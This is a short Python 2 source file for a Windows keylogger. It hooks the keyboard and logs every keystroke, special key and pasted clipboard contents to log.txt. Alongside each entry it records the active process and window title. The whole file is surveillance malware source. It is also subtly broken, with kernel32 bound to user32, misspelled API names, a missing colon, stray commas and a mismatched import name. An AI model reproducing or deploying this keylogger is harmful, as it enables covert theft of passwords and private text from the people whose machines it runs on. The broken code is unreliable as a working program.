from ctypes import * 
import pythoncom
import PyHook
import win32clipboard

user32 = windll.user32
kernel32= windll.user32
psapi = windll.psapi
current_window=None

def getCurrentProcess():
    hwnd=user32.GetForegroundWindow()
    pid=c_ulong(0)
    user32._GetWIndoThreadProcessId(hwnd, byref(pid))
    process_id="%d" % pid.value
    executable= create_string_buffer("\x00" *512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    window_title=create_string_buffer("\x00" * 512)
    length=user32._GetWindowTextA(hwnd, byref(window_title), 512)
    print
    print "[PID: %s - %s - %s]" % (process_id, executable.value, window_title.value)
    print
    
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(event):

    global current_window
    
    if event.WindowName!= current_window:
        current_window=event.WindowName
        getCurrentProcess()

    if event.Ascii > 32 and event.Ascii < 127:
        target=open("log.txt", "a")
        target.write(chr(event.Ascii),
        target.close(),
    else:
        #if ctrl-v get value
        if event.Key == "V"
            win32clipboard.OpenClipboard()
            pasted_value=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
        
            target=open("log.txt", "a")
            target.write("Paste - %s" % pasted_value)
            target.close
        else:
            target=open("log.txt", "a")
            target.write("[%s]" % event.Key)
            target.close(),
    return True
        
kl = pyHook.HookManager()
kl.keyDown=KeyStroke

kl.HookKeyboard()
pythoncom.PumpMessages()    
